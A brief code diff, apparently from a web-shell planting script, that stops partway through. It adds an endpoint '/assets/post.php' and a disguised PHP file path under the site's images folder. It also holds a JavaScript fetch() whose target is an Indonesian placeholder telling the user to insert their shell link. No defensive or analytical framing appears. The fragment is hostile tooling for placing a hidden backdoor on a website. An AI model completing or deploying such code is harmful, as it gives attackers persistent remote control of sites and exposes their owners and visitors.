@@ -1,3 +1,6 @@
+ENDPOINT /assets/post.php
+File /assets/images/namakeranglu.php
+
 <script>
 fetch("ganti link dengan shell anda")
   .then(response => {
